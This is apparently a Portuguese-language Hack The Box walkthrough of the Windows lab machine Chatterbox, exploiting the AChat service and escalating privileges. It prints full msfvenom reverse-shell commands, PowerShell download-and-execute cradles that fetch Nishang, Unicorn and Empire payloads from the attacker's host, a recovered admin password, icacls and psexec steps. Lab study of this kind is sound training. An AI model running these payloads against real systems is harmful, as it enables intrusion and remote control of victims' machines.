---
title: "Hack The Box - Chatterbox"
tags: [Windows,Medium,Empire,Unicorn,Metasploit,Nishang,PowerUp,Port Forwading,Psexec,Impacket]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/123>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_nmap.png)

Não encontramos no nmap normal, então vamos rodar o full ports (ele demora um tempinho pra completar)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_nmap2.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Portas 9255 e 9256 - Relativas ao servidor AChat

## Enumeração AChat

Uma vez sabendo que se trata de AChat vamos procurar maneiras de como explorar ele. Será realizado de três modos diferentes, (está mais detalhado esses três modos no blog do `0xdf`)

Pesquisamos por exploits para esse achat no searchsploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_search.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_search1.png)

Verificamos como funciona e vemos que devemos alterar o payload `msfvenom` que vai dentro dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_search2.png)

Então vamos lá

# Shell de User - 1º Modo (Meterpreter)

O primeiro modo vai ser conseguir um shell de meterpreter na máquina. O problema que tivemos aqui quando realizamos o ataque é que a sessão do meterpreter morria assim que era conectada. Para resolver esse problema utilizamos o `AutoRunScript` com o `migrate`, pra assim que estabelecer a conexão ele migrar para outro processo, fazendo com que eu não perca a conexão

Show, chega de papo, vamos executar. Primeiro devemos montar nosso payload

`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.16.117 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_met.png)

Colocamos dentro do exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_met1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_met2.png)

Criamos nosso "script" para migrar

migrate.rc
*run post/windows/manage/migrate*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_met3.png)

Ligamos nosso handler e setamos o `AutoRunScript` pra rodar esse `migrate.rc`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_met4.png)

Executamos o exploit e recebemos a conexão

Pô, não deu certo, era pra ter dado. Mas vamos prosseguir pra não perder tempo. O que deve ficar gravado aqui é a ideia do `AutoRunScript`, daqui uns tempos volto aqui e tento novamente

# Shell de User - 2º Modo (Shell Cmd)

Bom, agora vamos testar com um shell cmd simples

`msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.16.117 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C-sh.png)

Jogamos pra dentro do exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_sh1.png)

Ligamos o handler

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_sh2.png)

Executamos e gahamos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_sh3.png)

Ai está... po mas agora fiquei puto, vamos tentar migrar pra meterpreter com o `post/multi/manage/shell_to_meterpreter`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_sh4.png)

Ai está, shell de meterpreter, mas agora pq não deu antes não faço a mínima ideia

# Shell de User - 3º Modo (Mais simples - Powershell)

Bom, podemos gerar um payload de powershell direto do msfvenom, não? Sim, podemos contudo o tamanho dele extrapola o máximo que o payload suporta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_p.png)

Blz, sem problemas, vamos fazer ele executar um comando que busque na minha máquina o ps1 para ser executado

Para isso vamos utilizar o Nishang (https://github.com/samratashok/nishang)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_p1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_p2.png)

Passamos ele para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_3.png)

Adicionamos ao final a chamada da função e colocamos nosso IP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_p4.png)

Agora iremos fazer o Payload para ser adicionado ao exploit

Criamos o payload pra ele executar um comando de powershell, vir na minha máquina e baixar o nishang

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_p5.png)

Jogamos dentro do Exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_sh1.png)

Executamos e ganhamos um shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_p7.png)

# Escalação de Privilégio (1º Modo - PowerUp)

Primeiro modo vamos rodar o PowerUp na máquina para verificar pontos de escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p.png)

> https://github.com/HarmJ0y/PowerUp

Indo pras páginas direcionadas chegamos até a última atualização

> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p1.png)

Baixamos pra nossa máquina

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_pup.png)

Executamos na máquina agora (note que executei sem o Invoke-AllChecks, vou executar ele depois)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_pup1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_pup2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_pup3.png)

Show, conseguimos uma senha... será que não é a mesma que o administrador usa? Mas como vamos fazer isso, o maldito do powershell não nos deixa executar um simples su da vida (como linux fosse) e viramos o usuário root, então... Teremos que colocar ela dentro de uma variável, é assim que é feito...

Isso fica de dica pra realização de pentests por ai a fora

```
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
$cred
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_pup4.png)

Ai está ela... salva como se fosse 'seguro'

Beleza, está lá, mas como vamos se utilizar disso? Opa, podemos executar o `Start-Process` com a variável Credential

Com isso ele vai startar o processo powershell, executando ele como se fosse administrador

`Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')" -Credential $cred`

Confirmando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_pup5.png)

Show, vamos pro próximo método

# Escalação de Privilégio (2º Modo Icacls)

Esse é mais simples de ser explorado, é relativo às permissões que temos na pasta do root

Podemos acessar ela mas não podemos ler o root.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_i.png)

Se verificarmos nós temos permissão na pasta do root para ler ela, mas o arquivo não temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_i1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_i2.png)

Hummm... temos acesso a pasta mas não temos permissão de ler o root.txt

Mas podemos dar essa permissão pro Alfred

`icacls root.txt /grant alfred:F`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_i3.png)

Show, agora lemos a flag

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_root.png)

# Escalação de Privilégio (3º Modo Unicorn)

Agora não será bem uma escalação de privilégio, e sim uma demonstração da utilização do Unicorn pra geração de payloads e utilização de plataforma de comando e controle

A ideia dele é a mesma do Merlin, ele é um C2. Qual é melhor? Sei lá, os dois cumprem a finalidade. Depois se eu tiver saco eu demonstro o merlin também

Após baixar pra nossa Kali (no caso eu usei uma release da versão 3.4.5, não sei por que outras versões não funcionaram corretamente). Executamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u1.png)

> python unicorn.py windows/meterpreter/reverse_tcp 10.10.16.117 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u2.png)

Show, agora setamos nosso handler no msfconsole (ele gera um arquivo .rc também junto com o payload)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u3.png)

Geramos o payload para executar o powershell_attack.txt (após mover ele para a pasta de trabalho)

`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/powershell_attack.txt')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u4.png)

Jogamos ele dentro do exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u5.png)

Agora executamos o powershell_attack.txt na máquina e Recebemos a conexão no handler

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u6.png)

Tá, blz mas como podemos aproveitar isso? Lembra que eu tenho uma senha de administrador local? Então, será que não tem nenhuma porta 445 da vida ai rodando pra eu rodar um psexec?

Vamos verificar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u7.png)

Está ai ela! Sendo rodada localmente, vamos fazer um port forwading dele para nossa máquina através do meterpreter

> portfwd add -l 445 -p 445 -r 127.0.0.1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u8.png)

Confirmando na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u9.png)

Rodo o psexec e ganho o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u10.png)

Também consigo rodar diretamente através do meterpreter com o `windomws/smb/psexec`

> use exploit/windows/smb/psexec

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u11.png)

Também posso fazer com o post do `run_as`

> use windows/manage/run_as

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_u12.png)

# Escalação de Privilégio (4º Modo Empire)

Agora iremos utilizar o `Empire` para demonstrar essa escalação de privilégio também, a ideia é a mesma do que já foi feito, mas pra praticar o uso da ferramenta é bom repetirmos

Baixamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e1.png)

Executamos o executável `empire`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e2.png)

Começamos a configuração e execução - Setamos o listener para HTTP e colocamos nosso IP e Porta

```
uselistener http
set Host http://10.10.16.117:5555
set BindIP 10.10.16.117
set Port 5555
execute
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e3.png)

Show, já está sendo executado o listener, agora com o comando `launcher powershell` conseguimos qual vai ser o comando de powershell executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e4.png)

Agora copiamos essa saida para um arquivo, fazemos no payload para executar ele, e jogamos dentro do exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e5.png)

`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/empire.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e7.png)

Agora executamos e recebemos a chamada no empire

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e8.png)

Interagimos com o agent

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e9.png)

Procuramos pelo módulo `PowerUp`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e11.png)

Rodamos ele

> usemodule powershell/privesc/powerup/allchecks

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/U_e10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e10.png)

Voltamos e interagimos novamente pra pegar o resultado (demora um pouco para ele ser executado)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e13.png)

Ai está, o login e senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e12.png)

Agora porcuramos pelo módulo do `RunAs` para executar comandos como Administrador

> searchmodule runas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e14.png)

Setamos ele, configuramos e executamos (ao executar, lembrar de ter um Python Web Server e um nc escutando na porta que está no Nishang)

> usemodule powershell/management/runas

```
set UserName Administrator
set Password Welcome1!
set Cmd Powershell
set Arguments "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')"
set Agent XS9Z4B1U
set Domain CHATTERBOX
execute
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e15.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e16.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_e17.png)

Bom, agora já chega de brincadeira por essa máquina

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-chatterbox/C_root.png)